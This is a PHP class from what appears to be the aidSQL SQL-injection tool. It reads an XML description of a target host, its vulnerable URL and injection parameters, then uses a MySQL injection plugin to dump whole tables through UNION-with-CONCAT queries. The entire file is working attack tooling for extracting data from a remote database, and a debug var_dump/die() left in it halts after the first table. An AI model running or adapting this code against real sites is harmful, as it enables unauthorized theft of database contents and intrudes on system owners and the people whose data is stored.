<?php

	namespace aidSQL\db {

		class MySQLDbBuilder {

			private	$_xmlFile		=	NULL;
			private	$_config			=	NULL;
			private	$_logger			=	NULL;
			private	$_httpAdapter	=	NULL;
			private	$_pLoader		=	NULL;

			public function __construct(Array $config,\aidSQL\http\adapter &$httpAdapter,\aidSQL\core\PluginLoader &$pLoader,\aidSQL\core\Logger &$log){
	
				$this->_xmlFile		=	new \aidSQL\core\File($config["makedb"]);
				$this->_logger			=	$log;	
				$this->_httpAdapter	=	$httpAdapter;
				$pLoader->setConfig($config);
				$this->_pLoader		=	$pLoader;
				
				$this->makeDB();
	
			}

			public function setConfig(Array $config){
				$this->_config	=	$config;
			}

			private function parseXML(){

				$dom	=	new \DomDocument("1.0");
				$dom->load($this->_xmlFile->getFile());

				$host				=	$dom->getElementsByTagName("host")->item(0)->nodeValue;
				$link				=	$dom->getElementsByTagName("vulnlink")->item(0)->nodeValue;
				$domInjection	=	$dom->getElementsByTagName("injection")->item(0)->childNodes;
				$injection		=	array();

				foreach($domInjection as $inject){

					$nodeName		=	$inject->nodeName;
					$injectChilds	=	$inject->childNodes;

					foreach($injectChilds as $injectChild){

						if(sizeof($injectChild->childNodes)>0){
							$injection[$nodeName][]	=	$injectChild->nodeValue;
						}else{
							$injection[$nodeName]	=	$injectChild->nodeValue;
						}

					}

				}

				$url	=	new \aidSQL\core\Url($link);
				$url->addRequestVariable($injection["requestVariable"],$injection["requestValue"]);

				foreach($injection["requestVariables"] as $name=>$value){

					$url->addRequestVariable($name,$value);

				}

				$this->_httpAdapter->setUrl($url);

				$schemasArray	=	array();
				$schemas			=	$dom->getElementsByTagName("schemas")->item(0)->childNodes;

				foreach($schemas as $schema){

					$schemaName	=	$schema->getAttribute("name");
					$schemasArray[$schemaName]	=	array();
					$tables							=	$schema->getElementsByTagName("table");

					foreach($tables as $table){

						$tableAttributes	=	array();
						$i						=	0;

						$tablesArray	=	array();

						while($table->attributes->item($i)){

							$name							=	$table->attributes->item($i)->name;
							$value						=	$table->attributes->item($i++)->value;

							$tableAttributes[$name]	=	$value;

						}

						$tableName	=	$tableAttributes["name"];
						unset($tableAttributes["name"]);

						$tablesArray[$tableName]["attributes"]	=	$tableAttributes;

						$columns			=	$table->childNodes;
						$columnsArray	=	array();

						foreach($columns as $column){

							$colName	=	$column->getAttribute("name");
							$columnsArray[$colName]	=	array();
							$colChilds	=	$column->childNodes;
							
							foreach($colChilds as $colChild){
								$columnsArray[$colName][$colChild->nodeName]	=	$colChild->nodeValue;
							}

							$tablesArray[$tableName]["columns"]	=	$columnsArray;

						}

					}

					$schemasArray[$schemaName]	=	$tablesArray;

				}

				return $schemasArray;

			}

			public function makeDb(){

				$schemas	=	$this->parseXml();
				$plugin	=	$this->_pLoader->getPluginInstance("sqli","mysql5",$this->_httpAdapter,$this->_logger);
				$plugin->injectionUnionWithConcat();

				foreach($schemas as $schemaName=>$schemaTables){
					
						foreach($schemaTables as $schemaTableName=>$schemaTableValues){

							$attributes			=	$schemaTableValues["attributes"];
							$columns				=	array_keys($schemaTableValues["columns"]);
							$select				=	implode(',0x7c,',$columns);
							$from					=	$schemaName.'.'.$schemaTableName;
							$count				=	$plugin->count($columns[0],$from);
							var_dump($plugin->unionQueryIterateLimit($select,$from,array(),array(),$count[0]-1));
							die();

						}

				}

			}

		}

	}

?>
